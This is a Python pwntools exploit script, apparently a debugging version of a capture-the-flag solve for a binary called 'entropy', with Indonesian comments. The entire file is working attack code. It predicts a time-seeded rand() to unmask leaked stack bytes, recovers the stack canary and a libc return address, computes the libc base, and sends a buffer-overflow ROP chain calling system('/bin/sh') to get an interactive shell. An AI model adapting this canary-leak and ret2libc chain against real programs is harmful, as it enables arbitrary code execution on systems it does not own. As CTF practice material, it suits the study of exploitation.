from pwn import *
import ctypes
import time

context.binary = elf = ELF('./entropy')
context.log_level = 'info'

libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False) 
libc_rand = ctypes.CDLL(libc.path)

# Kita pakai process lokal untuk debugging
p = process('./entropy')

# --- LEAK LOGIC (Sama seperti solve.py) ---
log.info("Syncing seed time...")
p.sendline(b'72') 
server_rand = int(p.recvline().strip())

valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        break

libc_rand.srand(valid_seed)
libc_rand.rand() 

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    val = int(line)
    r = libc_rand.rand() & 0xff
    return val ^ r

canary = b'\x00' 
for i in range(73, 80):
    canary += p8(leak_byte(i))
canary = u64(canary)
log.success(f"Canary: {hex(canary)}")

ret_addr = b''
for i in range(104, 112):
    ret_addr += p8(leak_byte(i))
ret_addr = u64(ret_addr)

# --- HITUNG BASE (Gunakan offset lokal untuk debug) ---
# Karena ini lokal, kita pakai offset yang benar untuk libc lokal
libc.address = ret_addr - libc.symbols['__libc_start_main'] - 128 
# (Atau gunakan base dari vmmap jika script error)

log.success(f"Libc Base: {hex(libc.address)}")

# Gunakan gadget yang benar
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

# --- SUSUN PAYLOAD ---
payload = b'A' * 72
payload += p64(canary)
payload += b'B' * 8
payload += p64(0) # Saved RBX
payload += p64(0) # Saved RBP
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

# --- ATTACH GDB SEBELUM MENGIRIM PAYLOAD ---
log.info("Attaching GDB... (Breakpoint di ret)")
gdb.attach(p, gdbscript='b *main+233\nc')

p.sendline(payload)
p.interactive()
